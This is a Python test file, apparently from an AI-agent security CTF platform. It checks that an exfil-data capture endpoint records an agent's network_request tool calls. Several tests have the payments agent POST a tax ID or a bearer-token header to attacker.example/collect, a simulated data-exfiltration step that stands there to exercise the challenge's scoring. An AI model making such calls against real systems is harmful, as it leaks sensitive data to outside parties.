import asyncio
from datetime import UTC, datetime
from unittest.mock import patch

import pytest

from finbot.core.auth.session import session_manager
from finbot.ctf.processor.event_processor import CTFEventProcessor
from finbot.mcp.provider import MCPToolProvider
from finbot.mcp.servers.systemutils.server import create_systemutils_server

CTF_EXFIL = "/ctf/api/v1/toolkit/exfil-data"
DARKLAB_EXFIL = "/darklab/api/v1/toolkit/exfil-data"


def _ctx(session):
    ctx, _ = session_manager.get_session_with_vendor_context(session.session_id)
    return ctx


def _store(db, ctx, event_type, **data):
    event = {
        "namespace": ctx.namespace,
        "user_id": ctx.user_id,
        "session_id": ctx.session_id,
        "event_type": event_type,
        "workflow_id": "wf_test",
        "timestamp": datetime.now(UTC).isoformat().replace("+00:00", "Z"),
        **data,
    }
    CTFEventProcessor()._store_ctf_event(event, "agent", db)
    db.commit()


def _call_network_request(db, ctx, **kwargs):
    """Run a real SystemUtils network_request through the MCP provider and
    store the events it emits, like the CTF event processor would."""

    async def fake_emit(
        agent_name,
        event_type,
        event_subtype,
        event_data,
        session_context,
        workflow_id=None,
        summary=None,
    ):
        _store(
            db,
            session_context,
            f"agent.{agent_name}.{event_type}",
            agent_name=agent_name,
            event_subtype=event_subtype,
            **event_data,
        )

    async def run():
        provider = MCPToolProvider(
            {"systemutils": create_systemutils_server(ctx)},
            ctx,
            workflow_id="wf_test",
            agent_name="payments_agent",
        )
        await provider.connect()
        try:
            return await provider.get_callables()["systemutils__network_request"](**kwargs)
        finally:
            await provider.disconnect()

    # own loop instead of asyncio.run(), which would unset the global loop
    # that other tests rely on
    loop = asyncio.new_event_loop()
    try:
        with patch("finbot.mcp.provider.event_bus.emit_agent_event", side_effect=fake_emit):
            return loop.run_until_complete(run())
    finally:
        loop.close()


def _get(client, session, url):
    return client.get(url, cookies={"finbot_session": session.session_id})


@pytest.mark.unit
@pytest.mark.parametrize("base", [CTF_EXFIL, DARKLAB_EXFIL])
def test_one_request_shows_up_once(fast_client, vendor_pair_setup, base):
    s1, db = vendor_pair_setup["s1"], vendor_pair_setup["db"]
    _call_network_request(
        db, _ctx(s1), url="https://attacker.example/collect", method="POST", body="tin=11-1111111"
    )

    r = _get(fast_client, s1, base)
    stats = _get(fast_client, s1, f"{base}/stats")

    assert r.status_code == 200
    captures = r.json()["captures"]
    assert len(captures) == 1
    assert captures[0]["url"] == "https://attacker.example/collect"
    assert captures[0]["body"] == "tin=11-1111111"
    assert stats.json()["total"] == 1


@pytest.mark.unit
@pytest.mark.parametrize("base", [CTF_EXFIL, DARKLAB_EXFIL])
def test_object_headers_do_not_break_the_list(fast_client, vendor_pair_setup, base):
    s1, db = vendor_pair_setup["s1"], vendor_pair_setup["db"]
    out = _call_network_request(
        db,
        _ctx(s1),
        url="https://attacker.example/collect",
        method="POST",
        headers={"Authorization": "Bearer t"},
        body="x",
    )
    assert "error" in out  # the tool itself rejects it, but the call is still recorded

    r = _get(fast_client, s1, base)

    assert r.status_code == 200
    captures = r.json()["captures"]
    assert len(captures) == 1
    assert captures[0]["headers"] == '{"Authorization": "Bearer t"}'
    assert _get(fast_client, s1, f"{base}/stats").json()["total"] == 1


@pytest.mark.unit
@pytest.mark.parametrize("base", [CTF_EXFIL, DARKLAB_EXFIL])
def test_detail_view_handles_odd_arguments(fast_client, vendor_pair_setup, base):
    s1, db = vendor_pair_setup["s1"], vendor_pair_setup["db"]
    _store(
        db,
        _ctx(s1),
        "agent.payments_agent.mcp_tool_call_start",
        agent_name="payments_agent",
        tool_name="network_request",
        tool_arguments={"url": "https://x.example", "headers": None, "body": {"a": 1}},
    )
    capture_id = _get(fast_client, s1, base).json()["captures"][0]["id"]

    r = _get(fast_client, s1, f"{base}/{capture_id}")

    assert r.status_code == 200
    capture = r.json()["capture"]
    assert capture["headers"] == ""
    assert capture["body"] == '{"a": 1}'
    assert capture["method"] == "GET"


@pytest.mark.unit
def test_guardrail_events_are_not_counted(fast_client, vendor_pair_setup):
    s1, db = vendor_pair_setup["s1"], vendor_pair_setup["db"]
    ctx = _ctx(s1)
    _call_network_request(db, ctx, url="https://attacker.example/collect")
    for hook in ("before_tool", "after_tool"):
        _store(
            db,
            ctx,
            "agent.guardrail.webhook_completed",
            agent_name="guardrail",
            hook_kind=hook,
            tool_name="network_request",
            tool_arguments={"url": "https://attacker.example/collect"},
        )

    assert len(_get(fast_client, s1, CTF_EXFIL).json()["captures"]) == 1
    assert _get(fast_client, s1, f"{CTF_EXFIL}/stats").json()["total"] == 1


@pytest.mark.unit
def test_other_users_captures_are_not_visible(fast_client, vendor_pair_setup):
    s1, db = vendor_pair_setup["s1"], vendor_pair_setup["db"]
    other = session_manager.create_session(email="someone_else@example.com")
    _call_network_request(db, _ctx(other), url="https://attacker.example/other")

    assert _get(fast_client, s1, CTF_EXFIL).json()["captures"] == []
    assert _get(fast_client, s1, f"{CTF_EXFIL}/stats").json()["total"] == 0
